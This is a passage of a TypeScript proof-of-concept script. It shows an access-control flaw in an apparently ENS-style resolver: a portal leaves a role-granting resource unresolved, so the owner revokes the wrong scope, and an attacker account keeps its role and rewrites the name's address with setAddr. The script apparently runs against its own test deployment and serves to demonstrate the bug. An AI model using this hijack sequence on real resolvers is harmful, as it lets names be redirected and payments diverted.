        resource: toHex(partResource, { size: 32 }),
        roleBitmap: toHex(rolesBeforeRemoval),
      },
    ],
    buildResourceToNameMap([{ name }]),
  )
  const resolvedNames = grouped[0]?.resolvedNames ?? []
  const selectedName = resolvedNames.find((value) => value !== '(root)') ?? ''
  if (selectedName !== '' || resolvedNames.length !== 0) {
    throw new Error(`Expected unresolved part resource, got ${resolvedNames}`)
  }

  const wrongRootRemoval = revokeResolverRolesWriteParameters(ownerClient, {
    resolverAddress: resolver,
    targetAccount: attacker.address,
    scope: 'root',
    roles: ['ROLE_SET_ADDR'],
  })
  const removalHash = await ownerClient.writeContract(wrongRootRemoval)
  const removalReceipt = await wait(removalHash)
  if (removalReceipt.status !== 'success') {
    throw new Error('Expected wrong-scope removal transaction to succeed')
  }

  const rolesAfterRemoval = await readPartRoles()
  if (rolesAfterRemoval !== setAddressRole) {
    throw new Error(`Expected part role to remain, got ${rolesAfterRemoval}`)
  }

  const hijackHash = await attackerClient.writeContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'setAddr',
    args: [namehash(name), attacker.address],
  })
  await wait(hijackHash)
  const resolvedAfterAttackerWrite = await publicClient.readContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'addr',
    args: [namehash(name)],
  })
  if (resolvedAfterAttackerWrite !== attacker.address) {
    throw new Error('Attacker address write did not persist')
  }

  console.log(
    JSON.stringify(
      {
        resolver,
        name,
        assignedResolver,
        partResource: toHex(partResource, { size: 32 }),
        portalResolvedNames: resolvedNames,
        portalSelectedName: selectedName,
        rolesBeforeRemoval: rolesBeforeRemoval.toString(),
        removalTransactionStatus: removalReceipt.status,
        rolesAfterRemoval: rolesAfterRemoval.toString(),
        resolvedAfterAttackerWrite,
        deploymentHash: deployed.hash,
        grantHash,
        removalHash,
        hijackHash,
      },
      null,
      2,
    ),
  )
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```
